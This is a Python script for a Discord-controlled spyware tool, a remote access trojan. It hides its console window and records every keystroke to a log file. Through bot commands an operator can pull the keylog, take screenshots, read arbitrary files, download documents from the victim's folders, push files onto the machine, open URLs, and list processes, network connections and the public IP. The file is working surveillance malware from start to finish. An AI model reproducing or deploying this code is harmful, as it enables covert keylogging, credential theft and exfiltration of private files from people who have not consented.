import os
import psutil
import webbrowser
import win32gui
import win32con
import logging
import discord
from discord.ext import commands
from pynput import keyboard
import platform
import requests
from datetime import timedelta
from PIL import ImageGrab
import io
import shutil

def hide_console():
    window = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(window, win32con.SW_HIDE)

hide_console()

# Configure logging
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")

# Discord bot setup
TOKEN = ''  # Replace with your bot's token
CHANNEL_ID =   # Replace with your channel ID

# Define intents
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.voice_states = True
intents.messages = True

bot = commands.Bot(command_prefix='!', intents=intents)
bot.launch_time = discord.utils.utcnow()

@bot.event
async def on_ready():
    # Get the user (PC name)
    user_name = platform.node()
    
    # Get the channel
    channel = bot.get_channel(CHANNEL_ID)
    
    # Send the message
    if channel:
        await channel.send(f"@everyone User `{user_name}` joined")
    
    print(f'Logged in as {bot.user}')

def chunk_message(message, max_length=2000):
    return [message[i:i+max_length] for i in range(0, len(message), max_length)]

def log_pc_info():
    system_info = platform.uname()
    cpu_info = f"CPU: {system_info.processor}"
    system = f"System: {system_info.system} {system_info.release} {system_info.version}"
    node = f"Node: {system_info.node}"
    machine = f"Machine: {system_info.machine}"
    memory_info = psutil.virtual_memory()
    memory = f"Memory: {memory_info.total // (1024**3)} GB"

    try:
        ip_address = requests.get('https://api.ipify.org').text
    except requests.RequestException as e:
        ip_address = f"Could not get IP address: {e}"

    pc_info = f"{cpu_info}\n{system}\n{node}\n{machine}\n{memory}\nIP Address: {ip_address}"
    return pc_info

@bot.command(name='pcinfo')
async def pc_info(ctx):
    pc_info = log_pc_info()
    await ctx.send(f'```{pc_info}```')

@bot.command(name='logs')
async def get_logs(ctx):
    try:
        with open("keylog.txt", "r") as f:
            logs = f.read()
        if logs:
            await ctx.send(file=discord.File("keylog.txt"))
        else:
            await ctx.send('No logs available.')
    except Exception as e:
        await ctx.send(f'An error occurred while retrieving the logs:\n```{e}```')

@bot.command(name='storeinfo')
async def store_info(ctx):
    pc_info = log_pc_info()
    user_name = ctx.author.name
    guild = ctx.guild

    new_channel = await guild.create_text_channel(f"{user_name}'s-pc-info")
    await new_channel.send(f'PC Info for {user_name}:\n```{pc_info}```')
    await ctx.send(f'Created a new channel "{new_channel.name}" and stored the PC info there.')

@bot.command(name='ss')
async def screenshot(ctx):
    img = ImageGrab.grab()
    with io.BytesIO() as buf:
        img.save(buf, format='PNG')
        buf.seek(0)
        await ctx.send(file=discord.File(fp=buf, filename='screenshot.png'))

@bot.command(name='stopbot')
async def stop_bot(ctx):
    if ctx.channel.id == CHANNEL_ID:
        try:
            await ctx.send('Shutting down the bot...')
            await bot.close()
        except Exception as e:
            await ctx.send(f'An error occurred while stopping the bot: {e}')
    else:
        await ctx.send('You do not have permission to use this command in this channel.')

@bot.command(name='info')
async def bot_info(ctx):
    uptime = (discord.utils.utcnow() - bot.launch_time).total_seconds()
    uptime_str = str(timedelta(seconds=uptime))
    server_count = len(bot.guilds)
    await ctx.send(f'Bot has been up for {uptime_str}\nCurrently in {server_count} servers.')

@bot.command(name='ping')
async def ping(ctx):
    latency = bot.latency * 1000
    await ctx.send(f'Pong! Latency: {latency:.2f}ms')

@bot.command(name='check')
async def check(ctx):
    try:
        if bot.is_ready():
            status = "✅Bot is connected and operational."
        else:
            status = "❔Bot is not connected."
        try:
            with open("keylog.txt", "a") as f:
                f.write("Health check successful.\n")
            log_status = "✅Logging is functional."
        except Exception as e:
            log_status = f"❌Logging check failed: {e}"
        await ctx.send(f'Bot Status:\n{status}\n{log_status}')
    except Exception as e:
        await ctx.send(f'An error occurred during health check: {e}')

@bot.command(name='readfile')  # Restrict to bot owner
async def read_file(ctx, file_path: str):
    try:
        with open(file_path, 'r') as file:
            content = file.read()
            # If the content is long, send it as a file
            if len(content) > 2000:
                temp_file_path = 'temp_file.txt'
                with open(temp_file_path, 'w') as temp_file:
                    temp_file.write(content)
                await ctx.send(file=discord.File(temp_file_path))
                os.remove(temp_file_path)
            else:
                await ctx.send(f'```{content}```')
    except FileNotFoundError:
        await ctx.send(f'File not found: {file_path}')
    except Exception as e:
        await ctx.send(f'An error occurred while reading the file:\n```{e}```')

@bot.command(name='netconnections') # Restrict to bot owner
async def net_connections(ctx):
    try:
        connections = psutil.net_connections()
        if connections:
            connection_info = []
            for conn in connections:
                conn_details = f"Local: {conn.laddr.ip}:{conn.laddr.port} | Remote: {conn.raddr.ip if conn.raddr else 'N/A'}:{conn.raddr.port if conn.raddr else 'N/A'} | Status: {conn.status}"
                connection_info.append(conn_details)
            message = "\n".join(connection_info)
            file_path = 'network_connections.txt'
            with open(file_path, 'w') as file:
                file.write(message)
            await ctx.send(file=discord.File(file_path))
            os.remove(file_path)
        else:
            await ctx.send('No active network connections found.')
    except Exception as e:
        await ctx.send(f'An error occurred while retrieving network connections:\n```{e}```')

@bot.command(name='activeprocesses')  # Restrict to bot owner
async def active_processes(ctx):
    try:
        processes = [proc.name() for proc in psutil.process_iter(['name'])]
        message = "\n".join(processes)
        if len(message) > 2000:
            temp_file_path = 'active_processes.txt'
            with open(temp_file_path, 'w') as file:
                file.write(message)
            await ctx.send(file=discord.File(temp_file_path))
            os.remove(temp_file_path)
        else:
            await ctx.send(f'```{message}```')
    except Exception as e:
        await ctx.send(f'An error occurred while retrieving active processes:\n```{e}```')

@bot.command(name='openurl')
async def open_url(ctx, *, url: str):
    try:
        webbrowser.open(url)
        await ctx.send(f'Opened URL: {url}')
    except Exception as e:
        await ctx.send(f'An error occurred while opening the URL:\n```{e}```')

# File upload functionality
@bot.command(name='upload')
async def upload(ctx):
    await ctx.send("Please upload the file you want to save on the user's PC.")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.attachments:
        for attachment in message.attachments:
            file_path = os.path.join(os.path.expanduser('~'), 'Downloads', attachment.filename)
            await attachment.save(file_path)
            await message.channel.send(f'File saved: {file_path}')
    
    await bot.process_commands(message)

@bot.command(name='see')
async def see_files(ctx, directory: str):
    user_dirs = {
        'documents': os.path.join(os.path.expanduser('~'), 'Documents'),
        'desktop': os.path.join(os.path.expanduser('~'), 'Desktop'),
        'downloads': os.path.join(os.path.expanduser('~'), 'Downloads')
    }

    if directory.lower() not in user_dirs:
        await ctx.send(f'Unknown directory: {directory}')
        return
    
    path = user_dirs[directory.lower()]
    if not os.path.exists(path):
        await ctx.send(f'Directory not found: {path}')
        return

    try:
        files = os.listdir(path)
        if not files:
            await ctx.send(f'No files found in {directory}.')
        else:
            file_list = "\n".join(files)
            if len(file_list) > 2000:
                temp_file_path = 'files_list.txt'
                # Writing the file list with UTF-8 encoding
                with open(temp_file_path, 'w', encoding='utf-8') as temp_file:
                    temp_file.write(file_list)
                await ctx.send(file=discord.File(temp_file_path))
                os.remove(temp_file_path)
            else:
                await ctx.send(f'Files in {directory}:\n```{file_list}```')
    except Exception as e:
        await ctx.send(f'An error occurred while listing files in {directory}:\n```{e}```')


@bot.command(name='download')
async def download_file(ctx, *, file_info: str):
    parts = file_info.rsplit(' ', 1)
    
    if len(parts) != 2:
        await ctx.send('Please provide a filename followed by the directory (e.g., `!download File Name.txt Desktop`).')
        return
    
    filename, directory = parts[0], parts[1]

    user_dirs = {
        'documents': os.path.join(os.path.expanduser('~'), 'Documents'),
        'desktop': os.path.join(os.path.expanduser('~'), 'Desktop'),
        'downloads': os.path.join(os.path.expanduser('~'), 'Downloads')
    }

    if directory.lower() not in user_dirs:
        await ctx.send(f'Unknown directory: {directory}')
        return

    path = user_dirs[directory.lower()]
    file_path = os.path.join(path, filename)

    if not os.path.exists(file_path):
        await ctx.send(f'File not found: {filename} in {directory}')
        return

    try:
        await ctx.send(file=discord.File(file_path))
    except Exception as e:
        await ctx.send(f'An error occurred while sending the file:\n```{e}```')

def on_press(key):
    logging.info(str(key))

listener = keyboard.Listener(on_press=on_press)
listener.start()

bot.run(TOKEN)
